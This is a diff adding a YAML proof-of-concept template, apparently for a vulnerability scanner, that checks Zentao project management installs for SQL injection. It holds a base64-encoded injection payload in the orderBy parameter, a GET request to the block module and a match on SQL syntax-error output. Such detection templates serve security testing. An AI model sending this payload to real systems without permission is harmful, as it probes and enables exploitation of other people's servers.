@@ -1,0 +1,29 @@
+id: poc-yaml-zentao-sql-injection
+info:
+  name: Zentao 项目管理系统 SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Zentao
+  osprey-id: vb_2019_0052
+variables:
+  r_payload: base64("{\"orderBy\":\"order limit 1,1'\",\"num\":\"1,1\",\"type\":\"openedbyme\"}")
+  r_path: '/zentao/www
+
+    /zentao
+
+    /zentaopms
+
+    /zentaopms/www'
+requests:
+- method: GET
+  path: '{{.r_path}}/index.php?m=block&f=main&mode=getblockdata&blockid=case&param={{.r_payload}}'
+  headers:
+    Referer: '{{.base_url}}{{.r_path}}'
+  expression: 'status_code != 404 && contains(body, "SQLSTATE") && contains(body,
+    "Syntax error or access")
+
+    && contains(body, "AND  deleted  = ''0'' oRdEr bY `order`")
+
+    '
+transport: http
